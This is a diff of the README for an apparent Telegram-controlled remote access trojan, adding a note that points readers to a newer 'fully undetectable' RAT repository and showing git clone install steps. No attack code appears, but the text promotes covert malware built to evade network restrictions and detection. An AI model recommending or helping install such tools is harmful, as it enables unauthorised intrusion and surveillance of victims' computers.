@@ -2,7 +2,9 @@
     Cross Platform Telegram based RAT that communicates via telegram to evade network restrictions
 ![tel](https://github.com/machine1337/TelegramRAT/assets/82051128/bb2d8fc0-ed6e-421a-a8be-3f049620138e)
 
-
+# Note:
+    Use New Cross Platform RAT https://github.com/machine1337/pyFUD
+    
 # Installation:
     1. git clone https://github.com/machine1337/TelegramRAT.git
     2. Now Follow the instructions in HOW TO USE Section.
